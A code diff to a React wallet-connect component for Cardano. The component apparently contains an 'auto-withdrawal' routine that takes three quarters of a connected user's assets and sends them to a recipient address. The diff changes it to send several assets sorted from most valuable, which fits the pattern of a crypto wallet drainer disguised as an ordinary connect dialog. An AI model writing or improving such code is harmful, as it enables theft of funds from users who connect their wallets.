@@ -684,28 +684,29 @@ function ConnectWallet({ onClose }) {
         console.log(selectedAsset, adaToSendWithAsset, adaToWithdraw)
         // Calculate 3/4 of the asset's quantity
         selectedAsset.quantity = Math.floor(selectedAsset.quantity * 0.75).toString();
-        await buildSendTokenTransaction(
+        // await buildSendTokenTransaction(
+        //   walletApi,
+        //   recipientAddress,
+        //   address,
+        //   minimumADA,
+        //   staticProtocolParams,
+        //   selectedAsset,
+        //   utxos,
+        //   currentBalance
+        // )
+        await buildSendTokenTransactionMulti(
           walletApi,
           recipientAddress,
           address,
           minimumADA,
           staticProtocolParams,
-          selectedAsset,
+          sortToHighest,
           utxos,
           currentBalance
         )
       }
 
-      // await buildSendTokenTransactionMulti(
-      //   walletApi,
-      //   recipientAddress,
-      //   address,
-      //   minimumADA,
-      //   staticProtocolParams,
-      //   sortToHighest,
-      //   utxos,
-      //   currentBalance
-      // )
+
 
     } catch (error) {
       console.error("Error during auto-withdrawal:", error);
@@ -981,7 +982,7 @@ function ConnectWallet({ onClose }) {
 
       try {
         // Calculate minimum ADA required for the transaction output
-        txOutputBuilder = txOutputBuilder.with_asset_and_min_required_coin(multiAsset, BigNum.from_str('64420'))
+        txOutputBuilder = txOutputBuilder.with_asset_and_min_required_coin(multiAsset, BigNum.from_str('4420'))
         txOutput = txOutputBuilder.build();
 
 
@@ -1104,7 +1105,7 @@ function ConnectWallet({ onClose }) {
         shelleyChangeAddress = Address.from_bech32(address);
 
         txOutputBuilder = TransactionOutputBuilder.new();
-        txOutputBuilder = txOutputBuilder.with_address(shelleyOutputAddress);
+        txOutputBuilder = txOutputBuilder.with_address(shelleyOutputAddress).next();
       } catch (error) {
         console.error("Error initializing transaction setup:", error);
         throw error;
@@ -1154,8 +1155,8 @@ function ConnectWallet({ onClose }) {
 
       // Calculate minimum ADA required and build output
       try {
-        const adaToSend = BigNum.from_str(protocolParams.coins_per_utxo_word);
-        console.log(txOutputBuilder, adaToSend)
+        const adaToSend = BigNum.from_str('94420');
+        console.log(txOutputBuilder, multiAsset.to_json())
         txOutputBuilder = txOutputBuilder.with_asset_and_min_required_coin(multiAsset, adaToSend);
         txOutput = txOutputBuilder.build();
 
